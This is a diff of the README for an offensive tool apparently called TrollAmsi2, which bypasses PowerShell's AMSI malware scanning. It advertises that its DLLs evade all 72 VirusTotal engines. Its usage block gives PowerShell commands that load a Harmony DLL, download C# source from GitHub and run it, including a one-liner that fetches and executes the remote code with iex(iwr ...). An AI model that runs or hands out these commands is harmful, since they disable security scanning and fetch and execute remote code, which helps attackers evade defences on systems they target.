@@ -1,14 +1,20 @@
 # TrollAmsi2
+
+*Dll method*\
 Bypass powershell amsi \
-Both files are 0/72 on virus total and clean on hybrid-analysis \
+Both 0Harmony.dll and the compiled dll are 0/72 on virus total and clean on hybrid-analysis \
 If you are concerned with dropping on disk, ofcourse you can reflectively load
   
 ## Usage 
 ```
+#DLL method 
 $assembly = [System.Reflection.Assembly]::LoadFrom("C:\0Harmony.dll")
 $code = (iwr https://github.com/cybersectroll/TrollAmsi2/raw/refs/heads/main/TrollAmsi2.cs -UseBasicParsing).content
 Add-Type -TypeDefinition $code -ReferencedAssemblies "C:\0Harmony.dll"
 [TrollAmsi2]::SmokeOut()
+
+#powershell one liner
+iex(iwr https://raw.githubusercontent.com/cybersectroll/TrollAMSI2/refs/heads/main/TrollAmsi2.cs -UseBasicParsing).content
 ```
 
 ## MIT License for HarmonyLib
